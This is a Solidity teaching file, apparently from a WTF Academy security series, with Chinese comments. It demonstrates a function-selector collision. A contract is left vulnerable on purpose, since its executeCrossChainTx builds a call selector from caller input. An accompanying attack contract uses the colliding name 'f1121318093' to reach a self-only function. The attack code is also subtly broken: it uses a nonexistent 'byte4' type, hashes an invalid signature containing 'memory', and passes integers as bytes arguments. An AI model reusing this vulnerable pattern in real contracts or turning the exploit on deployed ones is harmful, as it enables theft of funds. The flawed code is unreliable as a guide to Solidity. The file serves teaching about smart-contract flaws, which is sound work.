
/** 
 *  SourceUnit: c:\Users\Administrator\Desktop\example4all\example4solidity\advanced\security\_02_SelectorClash.sol
*/

////// SPDX-License-Identifier-FLATTEN-SUPPRESS-WARNING:GPL-3.0
pragma solidity ^0.8.17;

/**
 * 函数选择器碰撞
 * https://github.com/WTFAcademy/WTF-Solidity/blob/main/S02_SelectorClash/readme.md
 */
contract SelectorClash {
    bool public solved; // 攻击是否成功

    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。
    function putCurEpochConPubKeyBytes(bytes memory _bytes) public {
        require(msg.sender == address(this), "Not Owner");
        solved = true;
    }

    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。
    // 该函数可以调用通过call来调用当前合约的任何方法
    // 相当于该函数是一个特殊权限的函数
    function executeCrossChainTx(
        bytes memory _method,
        bytes memory _bytes,
        bytes memory _bytes1,
        uint64 _num
    ) public returns (bool success) {
        (success, ) = address(this).call(
            abi.encodePacked(
                bytes4(keccak256(abi.encodePacked(_method, "(bytes,bytes,uint64)"))),
                abi.encode(_bytes, _bytes1, _num)
            )
        );
    }
}

contract SelectorClashAttack {
    SelectorClash public target;

    constructor(SelectorClash _target) {
        target = _target;
    }

    /**
     * 在这里, 我们想要通过调用executeCrossChainTx方法来攻击putCurEpochConPubKeyBytes(bytes memory)方法
     * 先计算出putCurEpochConPubKeyBytes(bytes memory)方法的函数选择器为0x41973cd9
     * 所以我们只要改变_method变量, 使得bytes4(keccak256(abi.encodePacked(_method, "(bytes,bytes,uint64)")))为0x41973cd9即可
     * 这里我们可以通过计算得到_method为f1121318093
     * 即f1121318093(bytes,bytes,uint64)的函数选择器也是0x41973cd9
     */
    function attack(address target) public {
        byte4 selector = bytes4(keccak256(abi.encodePacked("putCurEpochConPubKeyBytes(bytes memory)")));
        byte4 selector1 = bytes4(keccak256(abi.encodePacked("f1121318093(bytes,bytes,uint64)")));
        require(selector == selector1, "Selector not match");

        // 通过调用executeCrossChainTx方法来攻击putCurEpochConPubKeyBytes(bytes memory)方法
        SelectorClash(target).executeCrossChainTx(bytes("f1121318093"), 0, 0, 0);
    }
}

